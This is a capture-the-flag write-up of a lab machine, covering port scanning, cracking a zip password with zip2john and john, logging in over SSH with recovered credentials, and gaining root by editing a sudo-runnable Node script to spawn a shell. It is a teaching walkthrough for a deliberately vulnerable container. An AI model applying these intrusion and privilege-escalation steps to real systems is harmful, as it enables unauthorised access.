# ChocoloteLovers


## Port Enumeration

We started our scan using the Nmap tool during the discovery phase. We found the following open ports:

```ruby
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

```ruby
┌──(root㉿kali)-[/home/kali]
└─# nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2  
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64

```

## Examining ports

More precise scan of the FTP port:

```ruby
    nmap -p21 -T4 --min-rate 1000 --script vuln,ftp-anon,ftp-bounce,ftp-syst 172.17.0.2
```
![alt text](Imagenes/Node_1.png)

We see what appears the file called secretitopicaron.zip.

Similarly, I scanned the SSH port, but didn't find anything important

## Analyzing "secretitopicaron.Zip"

First we need to extract the hash from the .zip file. we use `zip2jonh` tool:

```ruby
zip2john secretitopicaron.zip > hash.txt
```

Once we have successfully extracted the file, our next step is to attempt to crack the password hash contained in the hash.txt file.

```ruby
john --wordlist=rockyou.txt hash.txt
```

```ruby
secretitopicaron.zip/password.txt:password1:password.txt:secretitopicaron.zip::secretitopicaron.zip
1 password hash cracked, 0 left
```

Finally, we obtain the password, `password1` . Now we can try extract secretetitopicaron.zip.
if we extract the file, we obtain a password file.

```ruby
mario:laKontraseñAmasmalotaHdelbarrioH
```

These are possible credentials for the SSH service.


## Intrusion

If we use the new credentials, we can access the SSH service.

![alt text](Imagenes/Node_3.png)


## Escalation privilege

For privilege escalation, we will use the following command:

```ruby
sudo -l
``
We see the commands we can execute as root or other users using sudo: 

```ruby
$ sudo -l
Matching Defaults entries for mario on 0730eda13522:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 0730eda13522:
    (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js

```

We can see that we can execute the script in /home/mario, so we can try to edit this file to spawn a shell with root privileges.


Therefore, we need to edit the script with the following code:

```ruby
const { execSync } = require('child_process');
execSync('/bin/bash', {stdio: 'inherit'});

```

Now, we are able to spawn a shell with root privileges if we execute the following:

```ruby
sudo /usr/bin/node /home/mario/script.js
```
![alt text](Imagenes/Node_2.png)
